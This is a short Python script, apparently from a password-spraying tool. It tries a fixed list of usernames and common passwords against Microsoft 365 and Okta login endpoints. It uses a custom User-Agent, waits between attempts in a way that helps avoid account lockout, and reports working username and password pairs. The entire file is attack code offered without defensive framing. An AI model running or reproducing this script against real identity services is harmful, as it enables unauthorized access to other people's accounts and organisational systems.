import requests
from time import sleep
from colorama import Fore

def start_spray(target, settings):
    usernames = ["admin", "user1", "user2"]
    passwords = ["Summer2024!", "Password123", "Welcome1"]

    for username in usernames:
        for password in passwords:
            print(Fore.CYAN + f"[~] Trying {username}:{password} on {target[\"name\"]}")
            try:
                if target["type"] == "m365":
                    res = requests.post(target["login_url"], data={
                        "resource": "https://graph.windows.net",
                        "client_id": "some-id",
                        "grant_type": "password",
                        "username": username,
                        "password": password
                    }, headers={"User-Agent": settings["user_agent"]})
                elif target["type"] == "okta":
                    res = requests.post(target["login_url"], json={
                        "username": username,
                        "password": password
                    }, headers={"User-Agent": settings["user_agent"]})
                else:
                    print(Fore.RED + "[!] Unknown target type.")
                    continue

                if "error" in res.text.lower():
                    print(Fore.RED + f"[-] Failed: {username}")
                else:
                    print(Fore.GREEN + f"[+] Success! {username}:{password}")
            except Exception as e:
                print(Fore.RED + f"[!] Error: {e}")
            sleep(settings["spray_interval"])

